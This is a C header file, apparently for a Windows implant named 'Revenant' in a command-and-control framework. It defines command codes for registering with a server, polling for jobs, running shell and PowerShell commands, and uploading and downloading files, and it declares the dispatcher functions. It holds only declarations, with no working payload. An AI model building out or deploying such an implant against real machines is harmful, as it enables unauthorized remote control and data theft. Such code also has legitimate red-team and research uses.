#ifndef REVENANT_COMMAND_H
#define REVENANT_COMMAND_H

#include <windows.h>
#include "Parser.h"

#define COMMAND_REGISTER         0x100
#define COMMAND_GET_JOB          0x101
#define COMMAND_NO_JOB           0x102
#define COMMAND_SHELL            0x152
#define COMMAND_PWSH             0x111
#define COMMAND_UPLOAD           0x153
#define COMMAND_DOWNLOAD         0x154
#define COMMAND_EXIT             0x155
#define COMMAND_OUTPUT           0x200

typedef struct {
    INT ID;
    VOID (*Function)(PPARSER Arguments);
} RVNT_COMMAND;

VOID CommandDispatcher();
VOID CommandShell(PPARSER Parser);
VOID CommandUpload(PPARSER Parser);
VOID CommandDownload(PPARSER Parser);
VOID CommandExit(PPARSER Parser);

#endif //REVENANT_COMMAND_H
